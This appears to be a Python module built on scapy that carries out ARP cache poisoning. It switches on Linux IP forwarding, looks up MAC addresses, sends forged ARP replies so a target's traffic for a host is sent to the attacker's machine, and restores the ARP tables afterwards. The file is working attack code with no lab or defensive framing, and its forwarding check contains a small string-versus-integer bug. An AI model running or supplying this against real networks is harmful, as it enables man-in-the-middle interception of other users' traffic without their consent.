from scapy.all import *
from scapy.layers.l2 import *


"""
Enables IP route ( IP Forward ) in linux-based distro
"""
def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


"""
Returns MAC address of any device connected to the network
If ip is down, returns None instead
"""
def get_mac(ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=10, verbose=0)
        if ans:
            return ans[0][1].src
        else:
            print("Unable to get mac for: " + ip + " please check the ip adress or try again later")
            exit()

def spoof(target_ip, host_ip, target_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    self_mac = ARP().hwsrc
    #print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
    #print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))